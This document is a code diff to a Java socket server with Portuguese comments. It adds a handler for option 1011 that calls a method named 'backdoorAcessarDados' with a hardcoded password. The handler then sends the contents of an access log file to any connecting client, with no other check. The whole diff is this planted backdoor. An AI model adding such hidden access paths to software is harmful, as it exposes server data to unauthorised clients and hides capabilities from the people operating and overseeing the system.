@@ -1,5 +1,6 @@
 package Servidor;
 
+import java.io.File;
 import java.io.IOException;
 import java.io.PrintStream;
 import java.net.Socket;
@@ -224,7 +225,27 @@ public class Servidor implements Runnable {
                     }
 
                     if (opcao == 1011) {
-                        
+                        // Chamar o método backdoorAcessarDados para gerar o log
+                        sistema.backdoorAcessarDados("senha_secreta");
+
+                        // Ler o conteúdo do arquivo de log gerado
+                        try {
+                            File arquivoLog = new File("log_acessos.txt");
+                            Scanner leitorLog = new Scanner(arquivoLog);
+
+                            StringBuilder conteudoLog = new StringBuilder();
+                            while (leitorLog.hasNextLine()) {
+                                conteudoLog.append(leitorLog.nextLine()).append("\n");
+                            }
+                            leitorLog.close();
+
+                            // Enviar o conteúdo do arquivo de log para o cliente
+                            saida.println(conteudoLog.toString());
+                        } catch (IOException e) {
+                            System.err.println("Erro ao ler o arquivo de log.");
+                            e.printStackTrace();
+                            saida.println("Erro ao ler o arquivo de log.");
+                        }
                     }
 
                
